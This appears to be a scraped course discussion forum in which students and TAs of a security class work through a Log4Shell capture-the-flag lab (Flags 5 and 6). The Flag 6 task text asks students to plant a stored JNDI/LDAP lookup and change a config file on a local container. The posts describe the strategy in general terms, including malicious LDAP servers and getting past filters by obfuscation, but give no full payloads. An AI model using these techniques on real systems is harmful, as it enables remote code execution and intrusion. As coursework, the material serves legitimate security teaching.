I am not seeing the pattern everyone keeps referencing, or where the acc number originates.  I have restarted the container and skimmed through the start up logs, I see the initial messages for the topics, but I guess I am not sure what to do with them.  I have tried using the other topics parameters to send a curl and all i get is errors, and looking through the error logs I don't really see anything helpful.  

Any direction anyone can provide?  I am kind of lost as to how to proceed here


1
Reply

Ashutosh Agarwal
5d
I would experiment with the parameters of the request using some unique strings. Then, review the logs to see if you can identify a method to manipulate the account number field.


Reply

Denis Kasapovic
5d
Some may disagree, but I wasn't a big fan of the word pattern. Kind of confused me. I ending up took it as looking for similarities since I was not seeing a pattern


1
Reply

Anh Tuan Hoang
6d

Resolved

I have managed to update the topic but for some reason my accountNum is also changed to the jndi lookup. Any help?


1
Reply

Joel M Tucker
5d
Make sure it's the right topic with the right value


Reply

Aaron Brooker
5d
Having this problem  too. A bit unsure how the accountNum is being changed to my jndi exploit. I am passing in my ID to accountNum.


Reply

Anh Tuan Hoang
5d
Hey i got it, try messing up the curl command, i injected at the wrong place that's why the accounNum is changed too


Reply

Kevin Darlington
5d
 Replying to Anh Tuan Hoang
Nice work!


Reply

Keymer Botero
6d

Resolved
I'm so close to actually getting this flag and scoring 3 flags in a a single day. Just struggling with getting the value of the account number to be my GATECH_ID. Any suggestions with this everyone? I'm seeing in this thread that there's a pattern but I'm not sure what that is referring too.. 

EDIT: NEVERMIND!! I SAW THE PATTERN THAT EVERYONE WAS REFERRING TO! I'M ON FIRE AFTER SO LONG!


4
Reply

Manan Himanshu Trivedi
6d

Resolved
Is the new topic already in the properties file or do we create a new one? Just a bit confused on that part. I keep getting NullPointerException when publishing, any suggestions/hints?


Reply

Ashutosh Agarwal
6d
You do not need to create a new topic. I'd suggest scanning the logs from the beginning after you restart the app. 


2
Reply

Cosdyn Akers
6d

Resolved
Found the new topic, have my attack vector, and figured out how to change the publishing user ID.  What I can't figure out is how to change the publishing topic.  I am using similar code from flag 4, but for some reason the topic is staying as user.info.  Is there a method to figure out what the topic parameter is named in the config.properties file?  I feel like I am missing something extremely simple, like I am not calling the topic name parameter properly in my java script to edit which topic is published.


Is my thought process in the right place, or should I try heading in a different direction?


Reply

Cosdyn Akers
6d
confirmed the name of the topic being called, still having trouble getting it to change.


Reply

Pesi Taototo
6d
I think you are heading in the right direction. Sometimes, I forget to use javac . When you make a change to a file, see for yourself by reading the file if the change persisted.


Reply

Steven Anthony Vasquez
1w

Resolved
Hi I get the feeling this was answered somewhere that I can't find but how do we restart the container without restarting the entire VM?


1
Reply

Joel M Tucker
1w
home directory has StopContainer and StartContainer scripts


Reply

Steven Anthony Vasquez
1w
Ah, completely missed that, thanks!


Reply

Joel M Tucker
1w
 Replying to Steven Anthony Vasquez
no worries! a lot of info thrown at you every project. It happens


1
Reply

Sunjie Lu
1w

Resolved
I put some prints in each of my Java to spot check if my scripts got run and when I run CURL for flag5, I surprised to find that my script for Flag4 was actually running according to my print. I have double checked my directory but still the same. What I am missing for set up?


Reply

Sunjie Lu
1w
Figured out here! Be sure to update the directory for your Malicious Server.

2. Run the Malicious Server:
Open a new terminal and make sure the active directory is the directory that contains your malicious .class file. For simplicity, we have created “Desktop/log4shell/{flag_no}” for you to work in. Do not leave this directory. Run the server in “Desktop/log4shell/{flag_no}” by the following command:

1
Reply

Robert Maness
1w

Resolved
Just got it. Just to recap some of what the below comments will point you toward:

It is very helpful to tail the console.log file and then restart the container to get those fresh logs.

You'll probably be well served to re-use some of your logic from Flag 4's Exploit.java file concerning config.properties

 Look at the curl that the instructions give you, and look at the logs. See if there is a value being passed that you could change from within the curl you're given. 


Reply

Lucy Lee
1w
omg, I struggled with this for 3 days and it finally clicked for me. Thank you!


1
Reply

Kevin Darlington
1w
Nice work!


Reply

Michelle Mao
1w

Resolved
I tired to inject my jndi into variable to fire my Exploit. It result in Status 500 Internal Server Error.  But in the log I did see the Topic read from properties file changed to my GT_ID. and also publishing to topic: is also my GT_ID. I'm not getting the flag is because of the error. 

I'm not sure how to update that accountNum.  I tried different CURL commands, try to find  the pattern or a way to trigger that other topic, but it just keep giving me 500 errors. :(


2
Reply

Kevin Darlington
1w
You need to set the topic name to the other topic. Your gatech id needs to be in the account number field. 


1
Reply

Michelle Mao
1w
Thank you so much! I got it now. 


Reply

Kevin Darlington
1w
 Replying to Michelle Mao
No problem and glad you got it! Nice work!


1
Reply

Michelle Mao
1w
Hints for others who are having same issues:

The error testing is important for you to understand the pattern of the new topic! 


1
Reply

J. Kendall Miller
1w

Resolved
When it says trick the application to publish to a different topic, are you saying a vector variable needs to be found or a file?


Reply

Zhao Rong Tan
1w
One of the comments below by the staff mentioned to take a look at fresh logs


Reply

J. Kendall Miller
1w
Yah, I got the information from the fresh logs, I just can't seem to figure out how to trick it to publish to the other topic.


Reply

J. Kendall Miller
1w
 Replying to J. Kendall Miller
Exploring a different curl protocol, but can't seem to get it to work. Am I overthinking it?


Reply

Zhao Rong Tan
1w
 Replying to J. Kendall Miller
My suggestion is to try publishing to the topic just to see what logs will be generated and analyze it carefully. You will be able to find what you need to figure out the trick to publish. Compare it against the hint the staff provided to look at the fresh logs carefully


Reply

J. Kendall Miller
1w
 Replying to Zhao Rong Tan
Do we need to change the curl protocol to publish? That seems to be what I am finding.


Reply

Zhao Rong Tan
1w
 Replying to J. Kendall Miller
Based on the writeup, you are to identify another topic to publish the message to, I suggest you to first try publishing to that identified topic with the provided curl convention just to see what logs will be generated and analyze it carefully. You will be able to find what you need to figure out the trick to publish. Compare it against the hint the staff provided to look at the fresh logs carefully. There will be a pattern where you will start to see once you compare the logs. Read the logs carefully and analyze them, it will be worth it.

You can do this! Will take note of this post as well if you require more clarifications.


1
Reply

J. Kendall Miller
1w
 Replying to Zhao Rong Tan
Can't seem to get past the 500 errors. I thought I saw a subtle difference but it gets thrown away in the PUT. Logs just seem to be pulling out what is required for the first topic and erroring out because it isn't finding everything for it.


Reply

J. Kendall Miller
1w
 Replying to J. Kendall Miller
That was somewhat difficult, but once I saw the pattern it took a while but I got the flag. Thanks.


1
Reply

Kevin Darlington
1w
 Replying to J. Kendall Miller
Nice work!


Reply

Zhao Rong Tan
1w
 Replying to J. Kendall Miller
Good work! Happy that you managed to detect the pattern and got the flag!


1
Reply

Michelle Mao
1w
 Replying to J. Kendall Miller
I'm at this place right now. I tried to play around with the required variables and changing values for them, but I can't see anything changing with the pattern. 


Reply

Zhao Rong Tan
1w
 Replying to Michelle Mao
I would advice you to compare the logs side by side if required. Once you see a pattern, you will be able to get the flag.

You are almost there!


1
Reply

Michelle Mao
1w
 Replying to Zhao Rong Tan
Thanks I got it :)!


1
Reply

Kevin Darlington
1w
 Replying to Michelle Mao
Nice work!


Reply

Emily Ngoc-Chau Nguyen Astillero
1w

Resolved
I was able to change the topic, but I still can't update the message being sent. 

I researched where the account number originates from and the pattern involved, and I'm still unsure if I should be using Exploit.java or Curl. I even looked at the github flag5 picture for hints. Any advice would be appreciated because I think I'm overcomplicating this.


Reply

Kevin Darlington
1w
I think that you are overcomplicating this. I would recommend playing with the requests parameters and seeing how those flow through the application. 


1
Reply

Emily Ngoc-Chau Nguyen Astillero
1w
That was scarily easy. Thank you so much!


1
Reply

Kevin Darlington
1w
 Replying to Emily Ngoc-Chau Nguyen Astillero
Nice work! :)


1
Reply

Xiaohua Cai
2w

Resolved
I have found the right different topic. But I am not sure where to update the accountNum value to be my GT_ID.  I know we will need to update the “config.properties” file in Exploit.java. Should I update  accountNum on the Exploit.java file or using the Curl command?


Reply

John Michael McPhillips
2w
Find a pattern of where the account number originates from, and you will find how to modify it.


Reply

Xiaohua Cai
2w
I have figured it out and get the flag. Thanks


2
Reply

Anh Tuan Hoang
6d
 Replying to Xiaohua Cai
i got the same problem as you, any clue as to where to update the accountNum?


Reply

Xiaohua Cai
5d
 Replying to Anh Tuan Hoang
check the log message and find a pattern o where the account number originates from. 


1
Reply

Ruangsak Patomwong
2w

Resolved
This is so hard, I cannot find the right different topic.


Reply

Kevin Darlington
2w
I suggest restarting the app to get fresh logs and going from there. Having a lot of noise in this project can make it harder to look. 


2
Reply

Ruangsak Patomwong
2w
I already restart and extract the logs from original instruction but no idea where could valid topics be. I search through cs6035.log and console.log but nothing interesting comes up. Could you provide me more hint please?


Reply

Ashutosh Agarwal
2w
 Replying to Ruangsak Patomwong
Scan the logs from the beginning after you restart the app. 


4
Reply

Ruangsak Patomwong
2w
 Replying to Ashutosh Agarwal
thank you, I got someting that I think it should helps.


1
Reply

Ruangsak Patomwong
2w
 Replying to Ashutosh Agarwal
Finally get the flag. thank you very much.


1
Reply

Ashutosh Agarwal
2w
 Replying to Ruangsak Patomwong
Great job!


1
Reply

Kevin Darlington
2w
 Replying to Ruangsak Patomwong
Nice work!


Reply

Lewis Won
1w
Thanks for this tip!


1
Reply

John Michael McPhillips
2w

Resolved
This builds off of flag 4. Pay attention to where the account number comes from.


7
Reply

Amrut Bhalchandra Kulkarni
1d
Others here are saying it builds off of 3... so it's a bit confusing


Reply

Anonymous Porcupine
2w

Resolved
I'm getting stuck with the (cleaned up) message:

Unable to get flag. Please ensure you entered your GatechId as the accountNumber in the messageVO body as instructed in the write up.
But I can see

INFO   Received message {[SELF REDACTED],"accountNum":"<my GTID>"} for topic: <target topic>
What am I missing?


1
Reply

Anonymous Porcupine
2w
\*facepalm\* I was passing the copy/pasted "" value for my GTID header. Updated it to my GTID and got the flag.


Reply

Kevin Darlington
2w
Nice work!


Reply

Matthew Joseph Claar
1w
 Replying to Kevin Darlington
Also dealing with the same error--have verified my GTID header is correct and matches in my exploit file. Would appreciate insight as my exploit appears to be appropriate directing to the new topic but clearly not publishing the value correctly


Reply

Kevin Darlington
1w
 Replying to Matthew Joseph Claar
Okay, so you have the exploit working, your gatech id is set in the header, you are overriding the topic, but your gatech is not being published in the account number field? Do I have this correct?


Reply

Matthew Joseph Claar
1w
 Replying to Kevin Darlington
That is correct as far as I can tell


Reply

Kevin Darlington
1w
 Replying to Matthew Joseph Claar
Okay got it. I would take a step back from exploiting and play with the parameters of the request with unique strings. Then map them through the logs and see if you can find a way to manipulate the account number field. 


Reply

Matthew Joseph Claar
7d
 Replying to Kevin Darlington
Corrected my method of passing and setting my GTID accountNum, gtg now


1
Reply

Kevin Darlington
7d
 Replying to Matthew Joseph Claar
Nice work!


Reply

Anonymous Dove
2w

Resolved
So I've been trying to look for the other topic that is supposed to be on the cs6035.log file but I am not sure if this is the way to go. Should I look for an already created topic or should I create a topic?

thanks


3
Reply

Kevin Darlington
2w
Correct, the other topic's name is in the logs. I recommend restarting the app and looking closely at the fresh logs.


9
Reply

Anonymous Wallaby
2w
If only I had read this comment two hours ago, it would have saved me a few hours.


1
Reply

Kevin Darlington
2w
 Replying to Anonymous Wallaby
No worries you have plenty of time, you are really doing great if you are this far in the first day of project release! haha


Reply

Anonymous Hippopotamus
2w
 Replying to Anonymous Wallaby
lol I thought the same thing


1
Reply

Anonymous Wallaby
2w
 Replying to Anonymous Hippopotamus
Classic that the comment gets released one minute after I solved it. LMAO


1
Reply

Anonymous Dove
2w
Got it! thanks.


1
Reply

Omar Arin Solaiman
2w
... 

The hours I've spent not looking at fresh logs...


1
Reply

Daniel Alexander Moreno
2w
Thank you, this was my issue too. While I restarted some things, restarting that didn't occur to me.


1
Reply

Emily Ngoc-Chau Nguyen Astillero
1w
This is a dumb question. But by restarting the app, do you mean sending the endpoint to the server again and checking it's resulting logs? Or are we restarting the container? 


Reply

Kevin Darlington
1w
 Replying to Emily Ngoc-Chau Nguyen Astillero
Not a dumb question! You by restarting the app it means ./Stop and ./Start container. When applications start they sometimes log checkpoints  and configurations ;)


8
Reply

Emily Ngoc-Chau Nguyen Astillero
1w
 Replying to Kevin Darlington
Thank you! I got it.


Reply

Kevin Darlington
1w
 Replying to Emily Ngoc-Chau Nguyen Astillero
Nice work!


Reply

Geri Louise Shaeffer
1w
This hint right here, plus the follow up response above, is very eye opening. 


1
Reply

Arianna Rachel Lanz
2w
I'd also say that if you don't see it right away, just try something and see what errors you get. I found the error logs to be pretty helpful!


1
Reply

Amrut Bhalchandra Kulkarni
1d
I think I found the correct topic

Key clue in the write up is that the app subscribes to it

Still figuring out how I can set its value though

Other posts say it's really similar to Flag3, and it involves the same config file


Reply

This comment was deleted
Matthew David Macioce
2d
I think I see a pattern/what everyone was mentioning - at least where accountNum is being pulled from once the topic is changed, but when I try to switch where my jndi is running/logging with my ID I just encounter 400 errors -- EDIT looks like I just needed a reset  of everything and that worked 


Reply

Kevin Darlington
2d
Nice work!


1
Reply



FLAG5-END

FLAG6-Start


---TASK-START-

FLAG 6: Restful Data (15 pts)
Make sure you have gone through the Setup and Intro sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag we will use the /products/ resource. There are four endpoints for this resource:

GET All - Fetch all product records

curl 'http://localhost:8080/rest/products/productlist' -H 'GATECH_ID:123456789' 

GET By ID - Fetch a single product record by ID

curl 'http://localhost:8080/rest/products/product/<id>' -H 'GATECH_ID:123456789' 

GET By Email - Fetch all records associated with an email (This will require you to create a new product with an email field. The initial set of products do not have an email persisted, they return with the default email)

curl 'http://localhost:8080/rest/products/product?email=example@example.com' -H 'GATECH_ID:123456789' 

POST Create or Update a new record - Post a new record or update an existing record by providing the id in the request

curl -X POST 'http://localhost:8080/rest/products/product' \
-H 'GATECH_ID:123456789' \
-H 'Content-Type: application/json' \
-d '{
"make": "Ford",
"model": "Mustang",
"trim": "GT",
"price": 45000.00,
"email": "example@example.com"
}'

We’ve explored introducing malicious strings to be triggered by the application as it accepts and processes an HTTP request. For this flag we’re going to explore an often overlooked attack vector for exploits like Log4J: Data at Rest.

Data at Rest is data that has already been persisted to some data store and is sitting idle. In the case of log4shell, this could be data that is structured in such a way that when the application retrieves and attempts to use or log it, it triggers the LDAP call.

Use the product POST endpoint to persist a record to the database that, when retrieved later, will trigger the LDAP call. You will have to inspect the logs of each of the endpoints to come up with a successful attack strategy.

You will use the log4j exploit to update the “config.properties” file saved in the root directory of the application similar to what you did in Flag 3 and Flag 5. You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated.

When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

Upon success, you should see your output similar to that below: Log file showing INFO messages from ProductService.java, with a flag revealed

*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****

---TASK-END
Skip to main content
Logo
CS 6035 O01, OCY
–
Ed Discussion

2

New Thread
Courses
56
35
Categories
576 others online
Use left and right arrow keys to adjust the split region size

New Thread
Filter
Use left and right arrow keys to adjust the split region size
Project Log4Shell - Flag 6 Restful Data #697
Kevin Darlington
2 weeks ago in Projects – Log4Shell

Pinned

Star

Watch

532
55
33
22
Views

1
This is the post for discussing this flag. If there's any update on the task, we'll post it here. Please, do not open new threads covering this task.

Anyone with questions about citations and plagiarism should consult the appropriate section of the course policy on misconduct.

Note: Do not share code, outside tools you used or any hints beyond the writeup or office hours to other students. We will delete threads and warn you if you overshare.

Comment

Sort by Newest 
Anne Mary Shea
13m
Unresolved
I am to the point where I am past the teapot message, my LDAP and python servers are hitting, and in the console log it is showing the "Entering Exploit." message. I receive an error saying "Valid product.id not found inin config.properties."

I reset my exploit code to try nc to see if there was a value placed for product.id, but I do not receive the "connection received" message.

Did anyone else run into this/have troubleshooting advice?


Reply

Keymer Botero
2h

Resolved

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA I DID IT, AFTER A STRAIGHT WEEK, I GOT IT!!! 
I swear, there were teapot messages that were getting in my way before that SOMEHOW weren't present! It's as if the problem itself finally threw me a bone AND I DID IT!

Thank you everyone on this thread, it's been an emotional journey throughout this lab and I'm so happy to have finally made it. For those just making it here, definitely read this thread. At this point, there are some helpful pointers that can help point in the right direction


1
Reply

Keymer Botero
2h
OH AND BEFORE I FORGET, YES DERP REALLY SAVED THE DAY FOR ME.

DO NOT PILE ON MULTIPLE EMPTY ENTRIES, YOU WILL LEAVE YOURSELF TRAPPED FOR DAYS


Reply

David Jaffie
3h
Unresolved
Has anyone figured out the "Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it."

I thought we just had to set product.id? Why is it asking about customer.service.email?


Reply

Keymer Botero
3h
Oh don't worry, This was something that Kevin and Joel mentioned. They forgot to update, so our job is actually to append the product.id of the malicious product into the config.properties.


1
Reply

David Jaffie
2h
Hm okay. I believe I am appending product.id, but I still just get the same customer.service.email warning. May just be a red herring.


1
Reply

Anh T. Le
4h

Resolved
Definitely, not an easy one...
If i'm giving out too much please delete this message. 
Confirm that there is no need for obfuscating. Look at the Log for POST something is definite in there that you can use, but also check what GET gives using all the endpoints.  


1
Reply

Keymer Botero
3h
I agree, although I'm stuck. I won't pry for details as that would go against policies established by TAs but I am definitely curious as to how you get the teapot messages if you did not need obfuscation.  


Reply

Anh T. Le
2h
Look at log for POST as other mention.

Try something like silly sillier silliest outofspacesilly like the TA mentioned.

There is one spot will stand out in Post log. 

Dont move to get until you spot that Log.

Thinking about buying car to modify the post curl what do you need to know abt the car.


1
Reply

Keymer Botero
2h
 Replying to Anh T. Le
Anh, I swear it right now, this post really saved me. I thought was gonna be websec all over again where my exploit DID perform what was required, but the flag generator just did not want me to get the last bit of points. 

The moment I found that spot, I was like HUH??? The funny part is, I could have sworn there were teapot messages saying otherwise, but there was not! Thank you so much Anh.


1
Reply

Joshua James Holder
7h

Resolved
Just a heads up, if you think you have everything right and it's still giving you the data at rest error, stop and start your container again. 

I had my payload good for two hours today and I was banging my head against the keyboard making slight tweaks. Then, I stopped/started the container, entered the same commands, and it gave me the flag. 


1
Reply

Sukhman Kaur
7h

Resolved
I am really struggling to get the exploit to even trigger. I used post and injected it somewhere there and can see it when calling another endpoint but it seems like its just as a string and never gets executed... does anyone have any helpful hints on what I could be doing wrong. Is the exploit supposed to trigger at post and get? mine is not triggering at either :(


Reply

Jason Clement Liu
7h
I found that the Office Hours #2 was very informative and would highly recommend you check it out. As others have stated before, this flag is about information at rest. Read the logs for each endpoint and understand where information is being stored.


1
Reply

Amrut Bhalchandra Kulkarni
7h
That's what I'm struggling with rn
I have a payload in POST that should work, but I'm trying to find a way to access it to run during GET


Reply

Jason Clement Liu
7h
 Replying to Amrut Bhalchandra Kulkarni
Make sure to check all the endpoints to see which would be the best method of exploiting your POST.


1
Reply

Amrut Bhalchandra Kulkarni
8h
Unresolved
I think I know which GET it is, but there's a vector there that I'm not sure how to populate
My exploit is in the db because of POST, but I'm not sure how to access it in GET


Reply

Keymer Botero
8h
Hey Amrut! I believe I know which one you are referring to. Be sure to note where everything is being logged when you are using that endpoint and see what's getting returned to you.


Reply

Amrut Bhalchandra Kulkarni
7h
I can see where all my POST info was logged, but I'm trying to access it so I can use it in GET


Reply

Amrut Bhalchandra Kulkarni
9h

Resolved
Did anyone else's LDAP ping when they executed their POST?

Since the GET is what's supposed to trigger it, idk if that's a good thing or not


Reply

Jason Clement Liu
7h
My LDAP server triggered when running my POST. Others below have reported that theirs did not trigger. I'm not sure, but I suppose that means it can be done in multiple ways.


1
Reply

Amrut Bhalchandra Kulkarni
9h

Resolved
I think I found the pattern in POST some folks have mentioned, but when I'm testing that theory, I get an error saying "IP Address pattern detected in request body. Aborting."

Any tips to avoid this?

Edit: Figured it out... and it was easier than predicted

Edit2: Checking the logs, the syntax for the pattern is messing up my attempted fix

Edit3: Found another simple fix that works; at least the syntax is what I'm used to seeing from other flags


1
Reply

Amrut Bhalchandra Kulkarni
10h

Resolved
I'm honestly very lost

I know that the data-at-rest component of this means our exploit is sent to the db with our malicious product, and I found a variable in one of the other endpoints that looks like it can be used for the main attack once our malicious product is called via GET.
I'm not entirely sure what to add to the malicious product and how it should interact with the other endpoints or how it would grab the id of the malicious product and pass that onto the other endpoint when the exploit is called.

Do we need multiple calls to the ldap using obfuscated exploit strings?


Reply

Keymer Botero
10h

Resolved
Alright, I am here to report mixed news. After much review, I have tweaked my approach to use as minimal obfuscation techniques as possible. However despite this, the section where the flag SHOULD appear is not visible in any way. This happened twice yesterday on my VMware setup on my desktop and now again on my laptop. Despite restarting the container each time and restarting the VM itself as well, I am met with the same pitfalls. Is there any way anyone could offer there insight in this matter?


Reply

Anonymous Alligator
11h

Resolved
I'm still a bit stuck.


If i'm getting the issue telling me that I need to make sure that the data is at rest, how do I discern this from the data actually not being at rest, or an issue within my obfuscation?  I've seen other comments mentioning that over-obfuscation can also cause the same message.


Additionally, is it required to leverage any other endpoints other than the 4 presented in the write-up for flag 6?  Say an endpoint from another flag?


Reply

Matthew David Macioce
10h
You don't have to leverage any endpoints other than the ones given in the write-up. I would take a listen to the office hours recording. Joel had a great point about obfuscating around the 29 minute mark. That combined with really looking for patterns/something off in the logs - should lead you in the right direction (I know that's frustrating as I'm sure you've been looking at the logs) but to Kevin's point, put in silly strings and see where they all get logged. Combining all of the tips really helped me get this flag 


Reply

Aniketh Swain
22h

Resolved
So I have inspected the logs from the POST, I see the very cool pattern to exploit and so I built my curl accordingly. But when I call the relevant GET to see if I am even able to trigger the ldap request from the data fetched, I don't see any print statements that I have in the Exploit.java file. I am checking the console.log file. Any thoughts/suggestions? I am avoiding the teapot issues so that shouldn't be an issue

Edit: Got the flag!! Ended up having an incorrect endpoint usage


Reply

Fahim Sunka
20h
Nice work! Marking resolved.


Reply

Cliff Chao
22h

Resolved
I recommend you don't start exploiting until you fully understand how to utilize the POST method, as everyone has said, the logs are the key.  There is something suspicious in there, but once you find it, it should be a EUREKA moment.. Fairly straightforward once you understand the logs.


3
Reply

Fahim Sunka
22h
Good point, in general for the flags, carefully examining the logs for hints and entry points will help significantly.


1
Reply

Yau Ming Kwan
1d

Resolved
Finally made it till the end! It's been a really tough week spending hours to get flags 1,2 and 4 and got so stuck in flag 3. Finally got flags 3, 5 and 6 in one go, inspecting the logs carefully is really the way to go.

LIGHTWEIGHT BABY!


2
Reply

Yau Ming Kwan
1d
Link to the office hour video for those who are still struggling: https://gtvault.sharepoint.com/sites/Course_cs_6035_o01_ocy-K4AbX3NT4s6GC/_layouts/15/stream.aspx?id=%2Fsites%2FCourse%5Fcs%5F6035%5Fo01%5Focy%2DK4AbX3NT4s6GC%2FShared%20Documents%2FOffice%20Hours%2FRecordings%2FLog4Shell%20Office%20Hours%20%5F2%2D20250304%5F185651%2DMeeting%20Recording%2Emp4


Reply

Matthew David Macioce
1d
Watching the video - I have input some strings into my POST call, I see where they're being logged, I guess I am just struggling how to use it to input my jndi, really no matter which one I use I seem to either trigger the teapot error (with no obfuscation), and if I use some obfuscation to get passed it, nothing happens on the servers. I can't tell if I am just using the wrong vector or too much obfuscation - I am guessing based on the comments in office hours though, I won't need to obfuscate/encode?


Reply

Anonymous Badger
1d
 Replying to Matthew David Macioce
Same thing happening to me, <redacted> but now the ldap server is not firing even though i see the exact correct malicious trigger logged after the GET call


Reply

Matthew David Macioce
1d
 Replying to Anonymous Badger
Yeah, I wasn't sure about that variable (assuming I am thinking of the same variable you're thinking of lol), I was just trying to input the jndi in different places in the POST command 


Reply

Anonymous Badger
1d
 Replying to Matthew David Macioce
Im talking about <redacted> but my server is not firing even though i can see the same valid trigger i have always used being logged


Reply

Joel M Tucker
1d
 Replying to Anonymous Badger
Watch the oversharing 


1
Reply

Anonymous Badger
1d
 Replying to Joel M Tucker
Apologies, was trying to be vague while still distinguishing from other potential red herrings


Reply

Joel M Tucker
1d
 Replying to Anonymous Badger
Not vague enough, calling out specific strategies using specific attack vectors is a bit much


Reply

Anonymous Badger
1d
 Replying to Joel M Tucker
Noted. Sorry about that


Reply

Michael Ryan Boling
1d

Resolved
I have found a pattern in one of the logs of one of the endpoints where, if the POST payload is constructed correctly, this pattern can be used to form the same malicious trigger that has been working for previous flags. I successfully do this and see the same trigger printed, but now my ldap server isn't firing? I am almost certain I am using the right strategy here (based on this thread https://edstem.org/us/courses/69023/discussion/6222726?comment=14562148 and other hints) but this is stumping me. I have triple checked for syntax errors already and this exact same trigger has worked for me in every other flag.


Reply

Yau Ming Kwan
1d
It should fire when you POST and fire again when you GET, which gives you the flag. Try not to obfuscate if it is not firing.


1
Reply

Michael Ryan Boling
1d
How would it fire when we POST? Wouldn’t that require you to set an entire field of the POST to the trigger instead of forming it to format correctly when they log their internal variable in the GET?


Reply

David Robert Nygren
1d
This is the hint I needed. Thank you.


1
Reply

Anonymous Badger
1d
 Replying to David Robert Nygren
Which hint? I am still unable to figure out why it's not firing


Reply

David Robert Nygren
1d
 Replying to Anonymous Badger
That it should fire after POST. If it's not doing that then my curl is probably incorrect. (I'm sure there's a way to do it without POST firing but knowing that it will work also if it DOES is nice to know for testing purposes). Of course, none of that will get the flag until you send the get but


1
Reply

Rakshaa Ravishankar
1d
 Replying to David Robert Nygren
I'm able to fire the LDAP iwth my POST but not any GET. am i on the right track or did I obfuscate too much>


Reply

David Robert Nygren
1d
 Replying to Rakshaa Ravishankar
I haven't got that far yet so I'm not sure haha. Sorry


Reply

Yau Ming Kwan
1d
 Replying to Rakshaa Ravishankar
Be sure you are with the correct attack vector. It’s quite obvious when you find it, and then you construct the payload to post.


Reply

Rakshaa Ravishankar
1d
 Replying to Yau Ming Kwan
I thought I found it, because it sets another variable to the same lookup in the logs. but when i try any of the GETS I get the data at rest error


Reply

David Robert Nygren
23h
 Replying to Yau Ming Kwan
I know the attack vector and can send jndi payloads through, but none of them trigger the LDAP after POST (I'm not expecting the flag at this step ofc). I think I'll take another crack at this tomorrow. I've tried no obfuscation (gets blocked), encoding, etc and nothing worked yet so we trek on later...


Reply

Yau Ming Kwan
19h
 Replying to David Robert Nygren
If you tried no obfuscation and it didn’t work out, you are probably not with the correct attack vector. Think about what is being logged, not what is being stored in the database (which will not trigger the lookup anyways).


1
Reply

Meer Ushter
2d

Resolved
So I am stuck at pretty much how others have posted on the thread ,

I am able to send my jndi through the post request (It did execute on post )
and I was able to get the jndi trigger by one of the get endpoint I can see the product.id as i have added print statement and saw it was added ,

But I still get "WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest"

I think it is coming from the data considering its part of the payload (hopefully i not revealing too much)
but even with dialing down the obfuscation I am still getting that. 

please any help on what i could try would be great I know im super close (i think )


1
Reply

Joel M Tucker
2d
Not a whole lot more help that we can give that we already haven’t in this thread and the office hours. But you’re close, keep at it!


1
Reply

Michael Ryan Boling
2d
same here


Reply

Meer Ushter
2d
I do see one of the patterns on the binding i wonder if theres something i can do i tried adjusting the payload  to match that pattern so far same issue .


1
Reply

Anonymous Badger
1d
I also found the pattern and I have constructed the payload so that when i send it their internal value will print the malicious trigger (based on this hint https://edstem.org/us/courses/69023/discussion/6222726?comment=14562148) but now the ldap server isn't even firing even though their internal variable is printing my exact trigger I have been using to solve previous flags


Reply

Meer Ushter
21h
 Replying to Anonymous Badger
so far i am using that pattern but still stuck on the same stuff 


Reply

Meer Ushter
19h
NVM got the flag , 
i guess my issue is i needed to use all of the payload and make sure how the payload is set to match your stuff , tbh i didn't even need to obfuscate  at all maybe just encode, you will know what i mean once you create that payload , there was one of the comment below that hinted, Its going to be one hell of a crazy car !


Reply

Rakshaa Ravishankar
2d
Unresolved
Does the data at rest warning mean I have at least set the malicious field with the lookup correctly? I got to the teacup message then changed one thing and the post was successful.  I see the LDAP and python server being triggered successfully too. When I attempt the diff GET requests it looks like my lookup is being retrieved from data at rest but I am still not getting the flag. Is it possible my obfuscation was too much? not sure what I'm missing here.


2
Reply

Amrut Bhalchandra Kulkarni
5h
I'm currently seeing the same error, and I used printlns to confirm that product.id did exit and it was set to the id of the malicious product


Reply

Matthew David Macioce
2d

Resolved
Running into the issue of my servers not firing, I am getting passed the teapot error though, is it safe to assume my issue is over obfuscating? I can use the GET calls, but I don't see the servers firing 


1
Reply

Bryan Curl
2d
This is where I'm at as well.


1
Reply

Joel M Tucker
1d
Take a look through the thread, this is a common one. 


1
Reply

Matthew David Macioce
1d
 Replying to Joel M Tucker
Thanks, some of the comments confused me a bit, but looked it up and seem to have my answer, appreciate it!


1
Reply

Joel M Tucker
1d
 Replying to Matthew David Macioce
awesome!


Reply

Andrew Naughton
2d

Resolved
Just got this after struggling for a couple of days. The hints in this thread are great. I'll stress that you really need to investigate the responses you get. 


1
Reply

Gantabya Kadel
2d

Resolved
Got the flag. 
Advice for folks who are stuck: pay close attention to the logs, how you are passing in that payload and even closer to how you are performing that GET. I spent all of yesterday being confused by a red herring and that too because I didn't pay attention to how I was performing my GET and why the "search" didn't "find" what was obviously there. 


1
Reply

David Robert Nygren
2d

Resolved
On one of the endpoints, I notice a random variable that, using a query, I can print plaintext to (Like in a previous flag). Is this supposed to be a distraction? 


Reply

Gantabya Kadel
2d
As mentioned down in the threads, you have more that one attack vector here but the key point is that, as mentioned in office hours, you need to get the exploit from data at rest. If you look further down in the threads, they even tell you the right sequence of reqs to make.


Reply

David Robert Nygren
2d
I know I won't receive the flag when I send in the malicious POST (thats for later at rest ofc), but should it trigger my LDAP anyway?


1
Reply

Gantabya Kadel
2d
Endorsed
 Replying to David Robert Nygren
well think about it ... all of them will trigger it the point is to use the correct one. Joel mentioned this in office hour yesterday if you watch it.


1
Reply

Cliff Chao
22h
There are a couple of red herrings in this assignment.. Once you find the attack vector it should be fairly apparent.


Reply

Michael Ryan Boling
2d

Resolved
